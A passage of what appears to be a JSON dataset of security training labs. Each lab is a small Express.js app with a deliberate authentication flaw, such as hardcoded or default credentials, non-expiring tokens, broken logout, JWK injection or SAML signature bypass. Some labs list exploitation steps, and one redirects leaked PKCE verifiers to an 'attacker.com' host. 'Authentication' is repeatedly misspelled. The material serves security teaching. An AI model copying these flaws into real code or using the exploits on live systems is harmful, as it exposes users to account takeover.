      "labDescription": "The application transmits session tokens in URL query parameters, making them visible in logs and browser history. This vulnerability can be exploited to hijack sessions.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable: session token passed in URL\napp.get('/dashboard', (req, res) => {\n  const token = req.query.token;\n  // Insecurely trusts the token from the URL\n  if (token === 'session123') {\n    res.send('Dashboard accessed');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Flawed CAPTCHA implementation on login",
      "labDescription": "The login form uses a weak CAPTCHA that always returns a fixed value, allowing attackers to bypass CAPTCHA verification during brute-force attacks.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: CAPTCHA always returns 'abcd'\napp.post('/login', (req, res) => {\n  const { username, password, captcha } = req.body;\n  if (username === 'user1' && password === 'pass1' && captcha === 'abcd') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Exposed debug endpoint bypassing authentication",
      "labDescription": "A debug mode endpoint exists that, when enabled, bypasses all Autnenticationchecks and automatically logs in the user.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: debug mode bypasses authentication\nconst DEBUG_MODE = true;\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  if (DEBUG_MODE) {\n    res.send(`Debug mode: ${username} logged in automatically`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Biometric Autnenticationfallback to hardcoded PIN",
      "labDescription": "A biometric login system falls back to a PIN when biometric verification fails. The PIN is hardcoded and weak, allowing attackers to bypass biometric checks.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: fallback PIN is hardcoded\napp.post('/biometricLogin', (req, res) => {\n  const { biometric, pin } = req.body;\n  if (biometric || pin === '1111') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Token expiration misconfiguration in authentication",
      "labDescription": "The Autnenticationsystem issues tokens that never expire due to misconfiguration, allowing attackers to reuse tokens indefinitely.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst SECRET = 'supersecret';\n\n// Vulnerable: token expiration set to never expire\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    const token = jwt.sign({ username }, SECRET, { expiresIn: '1000000 years' });\n    res.json({ token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Predictable API key generation without randomness",
      "labDescription": "An API key generation endpoint creates keys by concatenating fixed strings with the username. This predictable algorithm allows attackers to guess valid API keys.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: API key is generated predictably\napp.post('/generateApiKey', (req, res) => {\n  const { username } = req.body;\n  const apiKey = username + '_apikey';\n  res.send({ apiKey });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Misconfigured user role assignment on registration",
      "labDescription": "A registration process incorrectly assigns administrative roles to new users due to a configuration error, allowing attackers to gain elevated privileges.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: role assignment error\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  // New users are mistakenly assigned 'admin' role\n  res.send(`User ${username} registered with role admin`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Password reset via fixed security answer",
      "labDescription": "A password reset endpoint uses a fixed security question answer (e.g., 'pet's name' always 'fluffy') to authorize a reset, making it trivial for attackers to reset passwords.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: fixed security answer\napp.post('/resetPassword', (req, res) => {\n  const { username, securityAnswer, newPassword } = req.body;\n  if (securityAnswer === 'fluffy') {\n    res.send(`Password for ${username} reset to ${newPassword}`);\n  } else {\n    res.send('Incorrect security answer');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Token revocation failure on password change",
      "labDescription": "A password change endpoint does not revoke the old Autnenticationtoken, leaving it valid after the password is updated. An attacker with the old token can continue to access the account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: token not revoked after password change\napp.post('/changePassword', (req, res) => {\n  const { username, newPassword } = req.body;\n  // Simulate password change without revoking old token\n  res.send(`Password for ${username} changed to ${newPassword}. Old token remains valid.`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Open proxy for session tokens",
      "labDescription": "A proxy service handling session tokens does not validate or isolate tokens properly, allowing attackers to intercept and reuse tokens from different sessions.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: proxy service simply forwards session tokens without validation\nlet sessionTokens = {};\n\napp.post('/proxyLogin', (req, res) => {\n  const { username } = req.body;\n  // Simplified: assign a token and store it in a global object\n  const token = username + '_token';\n  sessionTokens[token] = username;\n  res.send({ token });\n});\n\napp.get('/proxyDashboard', (req, res) => {\n  const token = req.headers.authorization;\n  if (sessionTokens[token]) res.send(`Welcome, ${sessionTokens[token]}`);\n  else res.send('Invalid token');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure MFA fallback via SMS without proper validation",
      "labDescription": "A multi-factor Autnenticationsystem falls back to SMS verification when the primary factor fails, but the SMS code is not properly validated, allowing attackers to bypass MFA.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: SMS code fallback without proper validation\napp.post('/mfaLogin', (req, res) => {\n  const { username, password, smsCode } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    // Bypass MFA if any SMS code is provided\n    if (smsCode) res.send('MFA login successful');\n    else res.send('MFA required');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Steal Authorization Codes via Compromised PKCE Code Verifier",
      "labDescription": "This lab's OAuth implementation combines open redirects with flawed Proof Key for Code Exchange (PKCE) validation. To solve: 1. Exploit open redirect in `/auth` to leak PKCE `code_verifier`. 2. Reconstruct code challenge via SHA-256. 3. Hijack authorization code flow. 4. Access SCIM API to elevate privileges. The system caches code verifiers for 5 minutes.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nlet codeVerifiers = new Map();\n\n// Vulnerable redirect endpoint\napp.get('/auth', (req, res) => {\n  const { redirect } = req.query;\n  // Critical flaw: No redirect URI validation\n  res.redirect(302, decodeURIComponent(redirect));\n});\n\napp.get('/oauth/authorize', (req, res) => {\n  const verifier = crypto.randomBytes(32).toString('hex');\n  const challenge = crypto.createHash('sha256').update(verifier).digest('base64url');\n  \n  codeVerifiers.set(challenge, verifier);\n  \n  // Leak verifier via redirect parameter\n  res.redirect(`/auth?redirect=http://attacker.com/?challenge=${challenge}&verifier=${verifier}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code, code_verifier } = req.body;\n  const challenge = crypto.createHash('sha256').update(code_verifier).digest('base64url');\n  \n  // Vulnerability: Accepts any verifier matching challenge\n  if (codeVerifiers.has(challenge)) {\n    res.json({ access_token: 'admin_system_token' });\n  } else {\n    res.status(401).send('Invalid PKCE');\n  }\n});\n\napp.post('/scim/Admin', (req, res) => {\n  res.send('Admin privileges granted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth PKCE Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Forge Admin Tokens via JWK Header Injection",
      "labDescription": "This lab's JWT implementation trusts arbitrary JWK headers in unverified tokens. Exploit: 1. Extract public key from /jwks.json. 2. Generate malicious key pair. 3. Forge JWT with `jwk` header containing your public key. 4. Access /admin/keys to rotate system certificates.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst publicKey = `-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJb4...\n-----END PUBLIC KEY-----`;\n\n// Vulnerable JWT verification\nconst verifyToken = (token) => {\n  try {\n    // Critical flaw: Uses header-supplied JWK\n    return jwt.verify(token, (header, callback) => {\n      callback(null, header.jwk ? header.jwk.x5c[0] : publicKey);\n    }, { algorithms: ['RS256'] });\n  } catch (e) { return null; }\n};\n\napp.get('/admin/keys', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const payload = verifyToken(token);\n  \n  if (payload?.role === 'admin') {\n    res.send('CRYPTO KEYS ROTATED: Lab solved');\n  } else {\n    res.status(403).send('Admin required');\n  }\n});\n\napp.get('/jwks.json', (req, res) => {\n  res.json({\n    keys: [{ \n      kty: 'RSA',\n      use: 'sig',\n      x5c: [publicKey]\n    }]\n  });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWK Injection Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypachain SAML Validation via Canonicalization Attack",
      "labDescription": "This lab's SAML processor uses inconsistent XML canonicalization methods between validation and processing. Exploit: 1. Capture valid assertion. 2. Inject malicious attributes in different namespace. 3. Preserve original signature via C14N whitespace manipulation. 4. Access /audit as Domain Admin.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst xmlCrypto = require('xml-crypto');\nconst xmldom = require('xmldom');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/saml/acs', (req, res) => {\n  const samlResponse = Buffer.from(req.body.SAMLResponse, 'base64').toString();\n  const doc = new xmldom.DOMParser().parseFromString(samlResponse);\n\n  // Validation uses exclusive C14N\n  const valid = xmlCrypto.checkSignature(samlResponse, {\n    getKey: (keyInfo) => publicKey,\n    canonAlgorithm: 'http://www.w3.org/2001/10/xml-exc-c14n#'\n  });\n\n  // Processing uses inclusive C14N\n  const assertion = doc.getElementsByTagName('saml:Assertion')[0];\n  const role = assertion.getElementsByTagName('admin:Role')[0]?.textContent;\n\n  if (valid && role === 'DomainAdmin') {\n    res.send('AUDIT SYSTEM ACCESS: Lab solved');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML C14N Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Default admin credentials remain active",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability where the admin account still uses its default credentials. The system fails to force a change of these credentials, allowing an attacker to log in using the default username 'admin' and password 'admin123'. To solve the lab, simply log in using these default credentials and access the admin page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded admin credentials\nconst adminUser = { username: 'admin', password: 'admin123' };\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    if (username === adminUser.username && password === adminUser.password) {\n        res.send(`Welcome, ${username}! You have accessed the admin panel.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Default Credentials Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass via missing username validation",
      "labDescription": "This lab demonstrates an Autnenticationflaw where the application fails to properly validate the username field. When the username is submitted empty, the system automatically logs the user in as 'guest'. An attacker can exploit this flaw by leaving the username blank, thereby bypassing Autnenticationand gaining access. To solve the lab, submit an empty username along with any password to access the protected resource.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database\nconst users = [{ username: 'guest', password: 'guestpass' }];\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    let { username, password } = req.body;\n    // If username is empty, default to 'guest'\n    if (!username || username.trim() === '') {\n        username = 'guest';\n    }\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}! You have been logged in.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Missing Username Validation Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass via flawed conditional logic",
      "labDescription": "This lab demonstrates an Autnenticationbypass resulting from a coding error in the login function. Due to the misuse of the logical OR operator (||) instead of the logical AND (&&), the system incorrectly validates login attempts. As a result, an attacker can log in without knowing the correct password by exploiting this flaw. To solve the lab, use this logic flaw to gain access without valid credentials.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database\nconst users = [{ username: 'admin', password: 'adminpass' }];\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Vulnerable login route using flawed conditional logic\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    // Vulnerability: Using OR (||) instead of AND (&&) causes the condition to be true if either part is true\n    if (username === 'admin' || password === 'adminpass') {\n        res.send(`Welcome, admin! (Logged in via flawed logic)`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Flawed Conditional Logic Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Insecure deserialization in session tokens",
      "labDescription": "This lab demonstrates an Autnenticationbypass via insecure deserialization. The application stores session tokens as serialized JSON objects without proper validation. An attacker can craft a malicious token that modifies user properties (e.g., elevating privileges from 'user' to 'admin') and then use that token to access restricted resources. To solve the lab, exploit the insecure deserialization to forge a session token with administrative privileges.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Insecure session store that serializes user objects as JSON\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { secure: false }\n}));\n\n// Simulated user database\nconst users = [{ username: 'carlos', role: 'user', password: 'secret' }];\n\n// Login route: upon login, the user object is stored in session as JSON\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = JSON.stringify(user);\n        res.send('Login successful');\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Protected route: requires session token with role 'admin'\napp.get('/account', (req, res) => {\n    if (!req.session.user) return res.status(403).send('Access denied');\n    // Insecure deserialization\n    const user = JSON.parse(req.session.user);\n    if (user.role === 'admin') {\n        res.send('Welcome, admin! Access granted.');\n    } else {\n        res.status(403).send('Access denied');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Deserialization Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Insecure password change without current password verification",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability in the password change functionality. The application provides an endpoint to change a user's password but fails to verify the user's current password before updating it. This flaw allows an authenticated attacker to change any account's password without knowing the current password. To solve the lab, exploit this vulnerability to change the password of a target user and then log in with the new credentials.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'supersecretkey', resave: false, saveUninitialized: true }));\n\n// Simulated user database\nlet users = [\n    { username: 'carlos', password: 'oldpassword' }\n];\n\n// Login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = user.username;\n        res.send(`Logged in as ${username}`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Vulnerable password change endpoint (no current password verification)\napp.post('/change-password', (req, res) => {\n    const { username, newPassword } = req.body;\n    // Vulnerability: No check of the current password\n    const user = users.find(u => u.username === username);\n    if (user) {\n        user.password = newPassword;\n        res.send('Password changed successfully');\n    } else {\n        res.status(400).send('User not found');\n    }\n});\n\n// Protected resource\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome to your account, ${req.session.user}`);\n    } else {\n        res.status(403).send('Access denied');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Password Change Vulnerability Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "API key collision due to weak randomness",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability where API keys are generated using a weak random number generator, resulting in predictable or colliding keys. An attacker can enumerate or guess a valid API key to impersonate another user. To solve the lab, exploit this vulnerability by determining a valid API key and using it to access a protected API endpoint.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.json());\n\n// Simulated user database with API keys generated by weak randomness\nlet users = [\n    { username: 'carlos', apiKey: crypto.randomBytes(2).toString('hex') }  // Only 4 hex digits\n];\n\n// Endpoint to get API key (insecure, just for lab demonstration)\napp.get('/get-api-key', (req, res) => {\n    const { username } = req.query;\n    const user = users.find(u => u.username === username);\n    if (user) {\n        res.send(`Your API key is: ${user.apiKey}`);\n    } else {\n        res.status(404).send('User not found');\n    }\n});\n\n// Protected endpoint that requires a valid API key\napp.get('/account', (req, res) => {\n    const { apiKey } = req.query;\n    const user = users.find(u => u.apiKey === apiKey);\n    if (user) {\n        res.send(`Welcome, ${user.username}! You have accessed the protected API endpoint.`);\n    } else {\n        res.status(403).send('Access denied. Invalid API key.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`API Key Collision Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Extended session timeout vulnerability enabling session hijacking",
      "labDescription": "This lab demonstrates a vulnerability in session management. The application sets an excessively long session timeout without proper idle or absolute expiration. As a result, an attacker who intercepts a valid session cookie can reuse it to access protected resources even long after the user has logged in. To solve the lab, capture a valid session cookie and reuse it to access the victim's account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Session configuration with a long timeout (e.g., 24 hours)\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { maxAge: 24 * 60 * 60 * 1000 } // 24 hours\n}));\n\n// Simulated user database\nconst users = [{ username: 'victim', password: 'password123' }];\n\n// Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = user.username;\n        res.send(`Logged in as ${user.username}. Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\n// Protected account route\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome, ${req.session.user}! This is your account page.`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Extended Session Timeout Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Password recovery bypass via predictable secret question answers",
      "labDescription": "This lab demonstrates a vulnerability in the password recovery process. The application uses a secret question to verify the identity of the user, but the answers are based on publicly available or easily guessable information. An attacker can exploit this flaw by guessing the correct answer to reset the password of a target user. To solve the lab, enumerate and submit the correct answer to the secret question, reset the password, and then log in to the victim's account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database with secret questions\nlet users = [\n    { username: 'carlos', password: 'oldpassword', secretQuestion: 'What is your favorite color?', secretAnswer: 'blue' }\n];\n\n// Request password reset endpoint\napp.get('/reset', (req, res) => {\n    res.send(`\n        <h2>Password Reset</h2>\n        <form method=\"POST\" action=\"/reset\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <button type=\"submit\">Reset Password</button>\n        </form>\n    `);\n});\n\napp.post('/reset', (req, res) => {\n    const { username } = req.body;\n    const user = users.find(u => u.username === username);\n    if (!user) return res.send('User not found');\n    // Display secret question for the user\n    res.send(`\n        <h2>Answer Secret Question</h2>\n        <p>${user.secretQuestion}</p>\n        <form method=\"POST\" action=\"/recover\">\n            <input type=\"hidden\" name=\"username\" value=\"${username}\" />\n            <input type=\"text\" name=\"answer\" placeholder=\"Answer\" required />\n            <button type=\"submit\">Submit Answer</button>\n        </form>\n    `);\n});\n\n// Recover password endpoint\napp.post('/recover', (req, res) => {\n    const { username, answer } = req.body;\n    const user = users.find(u => u.username === username);\n    if (user && answer.toLowerCase() === user.secretAnswer.toLowerCase()) {\n        // Vulnerability: the token is not validated properly; simply allow password reset\n        user.password = 'newpassword';\n        res.send('Password reset successful. New password is \"newpassword\".');\n    } else {\n        res.send('Incorrect answer.');\n    }\n});\n\n// Login endpoint\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Password Recovery Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Improper logout handling allowing session reuse",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability caused by improper logout handling. The logout function fails to properly invalidate the user session, leaving the session cookie active. An attacker can exploit this vulnerability by capturing a valid session token before logout and then reusing it even after the user logs out. To solve the lab, capture the session token, simulate the logout process, and then reuse the token to access a protected resource.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// In-memory session store (for demonstration purposes)\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { maxAge: 60 * 60 * 1000 } // 1 hour\n}));\n\n// Simulated user database\nconst users = [{ username: 'carlos', password: 'password123' }];\n\n// Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = username;\n        res.send(`Welcome, ${username}! Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\n// Logout route that fails to properly destroy the session\napp.get('/logout', (req, res) => {\n    // Vulnerability: The session is not properly destroyed\n    res.send('Logged out (but session cookie still valid)');\n});\n\n// Protected account route\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome to your account, ${req.session.user}!`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Improper Logout Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Registration without duplicate email check",
      "labDescription": "The registration endpoint creates user accounts without checking if the email is already registered. This allows attackers to create multiple fake accounts using the same email.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no duplicate email verification\napp.post('/register', (req, res) => {\n  const { username, email, password } = req.body;\n  // In a real system, a duplicate check is needed\n  res.send(`User ${username} registered with email ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Legacy token exposure via URL query",
      "labDescription": "A legacy Autnenticationsystem passes a plaintext token in the URL query string, exposing it in browser history and logs. An attacker can intercept this token to hijack sessions.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable: token sent as URL query parameter\napp.get('/legacyLogin', (req, res) => {\n  const token = req.query.token;\n  if (token === 'legacyToken') {\n    res.send('Legacy login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure biometric matching algorithm",
      "labDescription": "A biometric Autnenticationendpoint uses a simplistic string comparison for biometric data. This weak matching allows an attacker to spoof biometric data by submitting a matching string.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: simplistic biometric check\napp.post('/biometricAuth', (req, res) => {\n  const { biometricData } = req.body;\n  // Stored biometric data is hardcoded\n  if (biometricData === 'fingerprint123') {\n    res.send('Biometric Autnenticationsuccessful');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "API token distribution via unsanitized header input",
      "labDescription": "An API endpoint generates tokens based solely on the client ID provided in request headers without proper validation, resulting in predictable tokens that attackers can easily guess.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: token generated from unvalidated client ID header\napp.post('/getApiToken', (req, res) => {\n  const clientId = req.headers['client-id'];\n  const token = clientId + '_token';\n  res.send({ token });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Unencrypted cookie values for session management",
      "labDescription": "Session cookies are stored in plaintext without encryption, making them vulnerable to interception and tampering by attackers.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\n// Vulnerable: cookies set in plaintext\napp.get('/setCookie', (req, res) => {\n  res.cookie('session', 'plainTextSession123');\n  res.send('Cookie set');\n});\n\napp.get('/getCookie', (req, res) => {\n  res.send(`Session: ${req.cookies.session}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Social login relying solely on username",
      "labDescription": "A social login endpoint accepts a username without verifying any associated token or email address, which allows attackers to impersonate users easily.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
